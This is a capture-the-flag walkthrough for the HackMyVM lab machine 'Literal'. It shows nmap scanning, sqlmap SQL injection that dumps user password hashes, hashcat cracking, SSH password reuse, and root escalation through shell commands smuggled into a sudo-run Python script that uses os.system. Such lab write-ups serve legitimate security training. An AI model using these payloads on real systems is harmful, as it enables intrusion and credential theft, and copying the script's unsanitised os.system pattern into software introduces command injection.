---
title: CTF Walkthrough for HackMyVM Machine Literal
date: 2024-10-01 00:00:00 +0300
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, SQLi]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/box-literal.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Literal a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Literal<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Literal](https://downloads.hackmyvm.eu/literal.zip)<br>
### Tools used
1) Nmap<br>
2) SQLMap<br>
3) Hashcat<br>
   
## Reconnaissance

First of all, we need to identify our target on the network. We do this by performing a host discovery scan on the current subnet.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Service]
└─$ nmap 10.0.2.16/24 -sn -oN live-host.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 15:54 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00046s latency).
Nmap scan report for 10.0.2.29
Host is up (0.00074s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds
```

After we have obtained the IP address of our target, we can perform a service scan to identify running services on the target.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Service]
└─$ nmap 10.0.2.29 -sC -sV  -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 15:54 BST
Nmap scan report for 10.0.2.29
Host is up (0.0098s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:ca:55:94:68:33:8b:50:42:f4:c2:b5:13:99:66:fe (RSA)
|   256 2d:b0:5e:6b:96:bd:0b:e3:14:fb:e0:d0:58:84:50:85 (ECDSA)
|_  256 92:d9:2a:5d:6f:58:db:85:56:d6:0c:99:68:b8:59:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://blog.literal.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

The target runs an SSH and a web server. In our scan result, we can identify the domain name and one subdomain name used by our target. Let's add these domains to our /etc/hosts file.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Service]
└─$ echo "10.0.2.29\tliteral.hmv  blog.literal.hmv" | sudo tee -a /etc/hosts
10.0.2.29       literal.hmv  blog.literal.hmv
```

Now that we have added the domains to our /etc/hosts file, let's visit the web application to see what it looks like.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/1-browse.png)

This web application appears to be Carlos's blog. We can see a login button on the navigation bar at the top right corner of the page. Let's click on this and visit the login page.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/login-page.png)

Since we do not have an account, we can click on "sign up for my blog" to create a normal user account on the target web application.
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/account-creation.png)

After creating an account, when we log in, we will a greeting message with a hyperlink that takes us to a project page
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/user-homepage.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/project-page.png)

This page allows us to filter projects depending on the project's status i.e. done, to do, or doing. This could be done by using the input parameter in a database query. Let's test this parameter for the presence of any SQL injection vulnerability using SQLMap.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Web]
└─$ sqlmap -u http://blog.literal.hmv/next_projects_to_do.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=vmbc58cd7jbarcmhtmfv83t6mt" --data "sentence-query=done" --batch  
<SNIP>
[16:18:33] [INFO] testing connection to the target URL
[16:18:33] [INFO] checking if the target is protected by some kind of WAF/IPS                                                          
[16:18:33] [INFO] testing if the target URL content is stable
[16:18:34] [INFO] target URL content is stable                     
[16:18:34] [INFO] testing if POST parameter 'sentence-query' is dynamic
[16:18:34] [INFO] POST parameter 'sentence-query' appears to be dynamic
[16:18:34] [WARNING] heuristic (basic) test shows that POST parameter 'sentence-query' might not be injectable   
<SNIP>
POST parameter 'sentence-query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
---
Parameter: sentence-query (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sentence-query=done' AND 7465=7465 AND 'oTFB'='oTFB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sentence-query=done' AND (SELECT 7754 FROM (SELECT(SLEEP(5)))IPZy) AND 'MIFr'='MIFr

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: sentence-query=done' UNION ALL SELECT NULL,NULL,CONCAT(0x716b626b71,0x78415845785158744b6b6255754b4d6258544349794b7952465a77775972717246754b4578435963,0x716a6a6271),NULL,NULL-- -
---
[16:18:45] [INFO] the back-end DBMS is MySQL
<SNIP>
[*] ending @ 16:18:45 /2024-09-30/
```

## Exploitation

The parameter appears to be vulnerable to SQL injection. Let's use this vulnerability to enumerate the database and dump important contents.
```bash
┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Web]
└─$ sqlmap -u http://blog.literal.hmv/next_projects_to_do.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=vmbc58cd7jbarcmhtmfv83t6mt" --data "sentence
-query=done" --dbs --batch
<SNIP>
[16:23:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[16:23:02] [INFO] fetching database names
available databases [4]:
[*] blog
[*] information_schema
[*] mysql
[*] performance_schema

[16:23:02] [INFO] fetched data logged to text files under '/home/pentester/.local/share/sqlmap/output/blog.literal.hmv'
[*] ending @ 16:23:02 /2024-09-30/

┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Web]
└─$ sqlmap -u http://blog.literal.hmv/next_projects_to_do.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=vmbc58cd7jbarcmhtmfv83t6mt" --data "sentence
-query=done" -D blog --tables --batch
<SNIP>
[16:25:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[16:25:08] [INFO] fetching tables for database: 'blog'
Database: blog
[2 tables]
+----------+
| projects |
| users    |
+----------+

[16:25:08] [INFO] fetched data logged to text files under '/home/pentester/.local/share/sqlmap/output/blog.literal.hmv'

[*] ending @ 16:25:08 /2024-09-30/

┌──(pentester㉿kali)-[~/…/HackMyVM/Literal/Scans/Web]
└─$ sqlmap -u http://blog.literal.hmv/next_projects_to_do.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=vmbc58cd7jbarcmhtmfv83t6mt" --data "sentence
-query=done" -D blog -T users --dump  --batch
<SNIP>
Database: blog
Table: users
[18 entries]
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
<SNIP>
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
<SNIP>
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
<SNIP>
| 18     | pentester | pentester@literal.hmv            | $2y$10$qYfDSonLuQc60.Mq2E8YBuOKrN0Vzg4QbpqmBB7BSqg8fLYn5JVAW | 2024-09-30 15:08:41 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+

<SNIP>
[*] ending @ 16:26:03 /2024-09-30/
```

After dumping the users table from the blog database we will notice that some users used a subdomain with the parent domain the same as our target domain. Let's add this subdomain to our /etc/hosts file and visit the new web application.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ echo "10.0.2.29\tforumtesting.literal.hmv" | sudo tee -a /etc/hosts      
10.0.2.29       forumtesting.literal.hmv
```

![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/2-browse.png)

When we visit the web application, we will see that we can filter our posts based on different categories. These categories are precise by sending a number to the category_id parameter of the category.php page. 
![](/assets/img/posts/walthrough/hackmyvm/2024-10-01-literal/category-page.png)

This filtering process could also be done more effectively by using a DBMS. For this reason, let's use SQLMap to test if the parameter is vulnerable to SQLi.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ sqlmap -u 'http://forumtesting.literal.hmv/category.php?category_id=1' --batch 
<SNIP>
GET parameter 'category_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 94 HTTP(s) requests:
---
Parameter: category_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category_id=1 AND (SELECT 4467 FROM (SELECT(SLEEP(5)))Dzqc)
---
[20:10:31] [INFO] the back-end DBMS is MySQL
<SNIP>
[*] ending @ 20:10:31 /2024-09-30/
```

We can see that the category_id parameter is also vulnerable to SQLi. We can leverage this vulnerability to enumerate this DBMS instance.
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ sqlmap -u 'http://forumtesting.literal.hmv/category.php?category_id=1' --dbs --batch
<SNIP>
available databases [3]:
[*] forumtesting
[*] information_schema
[*] performance_schema
<SNIP>
[*] ending @ 20:19:19 /2024-09-30/

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]            
└─$ sqlmap -u 'http://forumtesting.literal.hmv/category.php?category_id=1' -D forumtesting --tables --batch 
<SNIP>
Database: forumtesting
[5 tables]
+----------------+
| forum_category |
| forum_owner    |
| forum_posts    |
| forum_topics   |
| forum_users    |
+----------------+
<SNIP>
[*] ending @ 20:26:14 /2024-09-30/

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ sqlmap -u 'http://forumtesting.literal.hmv/category.php?category_id=1' -D forumtesting -T forum_owner --columns  --batch
<SNIP>
[20:34:29] [INFO] retrieved: varchar(100)
Database: forumtesting
Table: forum_owner
[5 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| created  | date         |
| email    | varchar(100) |
| id       | int          |
| password | varchar(200) |
| username | varchar(100) |
+----------+--------------+
<SNIP>
[*] ending @ 20:35:36 /2024-09-30/

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ sqlmap -u 'http://forumtesting.literal.hmv/category.php?category_id=1' -D forumtesting -T forum_owner -C email,username,password --dump --batch 
<SNIP>
+---------------------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+
| email                           | username | password|
+---------------------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+
| carlos@forumtesting.literal.htb | carlos   | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 |
+---------------------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+
<SNIP>
[*] ending @ 21:00:21 /2024-09-30/
```

We were able to enumerate the DBMS instance and dump the password hash of the user Carlos from the forum_owner table in the forumtesting database. This hash appears to be 128 characters which typically looks like a SHA-512 hash. We can use Hashcat module 1700 to crack this hash.  
```bash
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ echo -n 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | wc -m 
128

┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ hashcat -a 0 -m 1700 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 .rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99:<REDACTED>
<SNIP>
Started: Mon Sep 30 23:05:38 2024
Stopped: Mon Sep 30 23:06:06 2024
```

This password is made up of the subdomain of the web application and a number. If we try to use the same format for SSH i.e. the name of the service and the same number, we will successfully log in as the user Carlos. 
```bash
┌──(pentester㉿kali)-[~/Desktop/HackMyVM/Literal/Misc File]
└─$ ssh carlos@literal.hmv             
carlos@literal.hmv's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-146-generic x86_64)

<SNIP>
carlos@literal:~$ ls
my_things  user.txt
```

Now that we logged in as Carlos we can use this access to enumerate the system internally and read the user flag on the system.

## Post Exploitation

A quick enumeration of the user's sudo rights reveals that Carlos can run a Python script as the root user.
```bash
carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *

carlos@literal:~$ ls -l /opt/my_things/blog/update_project_status.py 
-rwxr-xr-x 1 root root 3041 Jun 21  2022 /opt/my_things/blog/update_project_status.py
```

Since we can read the file let's take a look at it's content.
```bash
carlos@literal:~$ less /opt/my_things/blog/update_project_status.py
```
```python
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''
import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

This Python script appears to run SQL queries by os.system() function instead of using the Python built-in module for SQL. This script takes two inputs, the first input arg_project_id is used to build the SQL query passed to the -e parameter of the mysql command while the second input arg_project_status is simply used in a conditional statement. Our interest here will be to inject commands in the arg_project_id input since no verification is done. We will attempt to create malformed SQL queries and execute commands on the system since the os.system() function's primary role is to execute system commands and not SQL queries.
```bash
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '";whoami #"' 'To do'
[+] Before update project (";whoami #")

<SNIP>
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
root
```

We can see that the ```whomai``` command passed here was executed  this is because the ```;``` closes the actual command and the ```#``` comments anything after our injected command hence whoami can be executed peacefully. We can use this to obtain a root shell and read the flag by executing the su command.
```bash
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py '";su #"' 'To do'
[+] Before update project (";su #")

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
root@literal:/home/carlos# ls /root
root.txt   <SNIP>
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an SQL injection vulnerability to enumerate a system a system and found a hidden domain a normal fuzzing could not uncover. Finally, you have exploited the same password syntax usage to obtain a foothold on the target and obtain root access due to the bad implementation of Python modules and lack of sanitisation of user input. This machine was designed to show how improper sanitisation of user input either in web applications or in scripts could seriously affect the security posture of an organisation. Thank you for following up on this walkthrough.
